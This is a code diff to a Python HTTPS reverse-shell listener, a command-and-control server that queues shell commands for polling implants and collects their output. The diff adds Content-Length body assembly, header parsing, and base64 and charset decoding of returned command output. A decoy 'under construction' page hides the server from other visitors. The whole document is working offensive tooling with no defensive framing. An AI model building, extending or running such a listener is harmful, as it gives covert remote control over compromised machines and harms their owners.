@@ -9,6 +9,7 @@ from queue import Queue, Empty
 import threading
 import json
 import sys
+import base64
 
 # handle command line arguments
 argument_parser = argparse.ArgumentParser(description='HTTPS Reverse Shell Listener')
@@ -58,56 +59,119 @@ def build_response(headers, payload):
     res += payload
     return res.encode("utf-8")
 
+"""
+def parse_headers(header_bytes):
+    header_str = header_bytes.decode("utf-8")
+    header_lines = header_bytes.split(b"\r\n")
+    headers = {}
+    for line in header_lines:
+        key_and_value = line.split(b":", 1)
 
+        if len(key_and_value) < 2: # invalid header
+            continue
+
+        key = key_and_value[0]
+        value = key_and_value[1]
+        headers[key] = value
+
+    return headers
+"""
+# don't bother with type checking, if there is a parsing problem then just hit them with a 400
+def parse_headers(header_bytes):
+    headers = {}
+    header_str = header_bytes.decode("utf-8")
+    for line in header_str.splitlines():
+        key_and_value = line.split(":", 1)
+        if len(key_and_value) < 2:
+            continue
+        key, value = key_and_value
+        headers[key.lower()] = value.strip()
+    return headers
+   
 # Interact with client
 def handle_client(conn, source):
-    received = conn.recv()
+    try:
+        received = conn.recv() # receive first chunk
+    
+        #print(received)
+        head_and_body = received.split(b"\r\n\r\n", 1)
+        head = head_and_body[0]
+        body = head_and_body[1] or b""
 
-    # Client asks for commands
-    if received.startswith(heartbeat_get):
-        """
-        # ToDo: build proper session management and separate clients
-        if source[0] not in active_clients:
-            active_clients.add(source[0])
-            output_queue.put(json.dumps({ "output": "[!] New client connected:" + source[0]}))
-        """
+        headers = parse_headers(head)
+        content_length_str = headers.get("content-length")
 
-        command = deq(command_queue) # get command from queue or <None>
+        #  Look for Content-Length header
+        if content_length_str:
+            content_length = int(content_length_str)
 
-        headers = {
-            "Content-Type": "application/json",
-            "Connection": "Closed"
-        }
+            print("Content-Length parsed: {}".format(content_length))
 
-        # Pack as json. <None> gets turned into <null> automatically
-        payload = { "com" : command } 
-        body = json.dumps(payload)
+            while len(body) < content_length:
+                print("[!] Acquiring another chunk")
+                chunk = conn.recv()
+                if not chunk:
+                    print("[!] Received data unequal Content-Length")
+                    break
+                body += chunk
+                #received += chunk
 
-        conn.write(build_response(headers, body))
+        # Client asks for commands
+        if received.startswith(heartbeat_get):
+            """
+            # ToDo: build proper session management and separate clients
+            if source[0] not in active_clients:
+                active_clients.add(source[0])
+                output_queue.put(json.dumps({ "output": "[!] New client connected:" + source[0]}))
+            """
+
+            command = deq(command_queue) # get command from queue or <None>
+
+            response_headers = {
+                "Content-Type": "application/json",
+                "Connection": "Closed"
+            }
+
+            # Pack as json. <None> gets turned into <null> automatically
+            response_payload = { "com" : command } 
+            response_body = json.dumps(response_payload)
+
+            conn.write(build_response(response_headers, response_body))
+            conn.close()
+            return
+
+        # Client returns command response
+        if received.startswith(response_post):
+            """
+            head_body = received.split(b"\r\n\r\n", 1)
+            if len(head_body) > 1:
+                body = head_body[1]
+                output_queue.put(body) # hand over command output to I/O loop
+            """
+            output_queue.put(body)
+
+            # respond whatever
+            response_headers = {
+                "Content-Type": "text/plain; charset=utf-8",
+                "Connection": "Closed"
+            }
+            response_payload = "Sasquatch"
+
+            conn.write(build_response(response_headers, response_payload))
+            conn.close()
+            return
+
+        # fob off unwanted guests
+        conn.write(build_response({"Content-Type": "text/plain; charset=utf-8", "Connection": "Closed"}, "This page is under construction."))
         conn.close()
-        return
 
-    # Client returns command response
-    if received.startswith(response_post):
-        head_body = received.split(b"\r\n\r\n", 1)
-        if len(head_body) > 1:
-            body = head_body[1]
-            output_queue.put(body) # hand over command output to I/O loop
+    except Exception as e:
+        print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
+        print(e)
+        if conn:
+            conn.write(b"HTTP/1.1 400 Bad Request\r\nConnection: Closed\r\n\r\n")
+            conn.close()
 
-        # respond whatever
-        headers = {
-            "Content-Type": "text/plain; charset=utf-8",
-            "Connection": "Closed"
-        }
-        payload = "Sasquatch"
-
-        conn.write(build_response(headers, payload))
-        conn.close()
-        return
-
-    # fob off unwanted guests
-    conn.write(build_response({"Content-Type": "text/plain; charset=utf-8", "Connection": "Closed"}, "This page is under construction."))
-    conn.close()
 
 # Create SSL/TLS context which we use to wrap all incoming connections
 context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
@@ -144,13 +208,29 @@ server_thread = threading.Thread(target=listening_loop)
 server_thread.setDaemon(True)
 server_thread.start()
 
+def figure_out_charset(input_bytes):
+    encodings = ["utf-8", "ascii", "latin_1", "cp1251", "cp1252", "cp1250", "cp424", "cp437", "big5", "big5hkscs", "shift_jis"]
+    for encoding in encodings:
+        try:
+            output = input_bytes.decode(encoding)
+            print("Detected: " + encoding)
+            return output
+        except:
+            pass
+    return input_bytes
+
+
 # Decide what and how to display command response/error
 def display_response(response):
+    #print(response)
     res_json = json.loads(response)
-    print(res_json.get("output"))
+    if(res_json.get("output")):
+        dec = base64.b64decode(res_json.get("output"))
+        print(figure_out_charset(dec))
 
     if(res_json.get("error")):
-        print("Error:", res_json.get("error"))
+        dec = base64.b64decode(res_json.get("error"))
+        print("Error:", figure_out_charset(dec))
 
 # I/O Loop
 response_timeout = 10
